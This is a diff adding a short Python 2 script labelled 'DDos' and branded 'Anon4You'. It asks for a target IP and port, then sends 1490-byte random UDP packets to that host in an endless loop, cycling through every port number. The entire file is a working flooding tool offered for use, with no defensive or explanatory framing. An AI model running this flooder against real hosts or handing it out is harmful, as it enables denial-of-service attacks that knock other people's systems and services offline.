@@ -1,0 +1,51 @@
+#Don't coppy without giving me credit
+
+#Author : BISHAL SINGH
+
+import sys
+import os
+import time
+import socket
+import random
+def runntxt(s):
+        for anon in s + '\n':
+                    sys.stdout.write(anon)
+                    sys.stdout.flush()
+                    time.sleep(100./2100)
+
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+os.system("clear")
+print("\033[31m")
+os.system("figlet DDos")
+print('\033[36m'+"                    A tool by"'\033[31m'+" ["'\033[37m'+"Anon"'\033[32m'+"4"'\033[37m'+"You"'\033[31m'+"]")
+print("\033[37m")
+print "Author : BISHAL SINGH"
+print("\033[32m")
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+
+runntxt("Loading"'\033[37m'"=========================================="'\033[32m'"100%")
+time.sleep(5)
+print("\033[31m")
+print "             #########[started]#########"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
